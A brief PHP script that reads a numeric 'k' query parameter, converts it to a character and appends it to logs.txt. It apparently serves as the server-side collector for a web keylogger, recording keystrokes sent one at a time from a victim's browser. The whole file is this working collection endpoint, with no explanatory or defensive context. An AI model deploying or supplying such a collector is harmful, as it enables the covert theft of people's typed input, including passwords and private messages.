<?php

$logs = chr($_GET["k"]);

$archivo = "logs";

$file = fopen("$archivo.txt", "a");
fwrite($file, $logs);
fclose($file);

?>
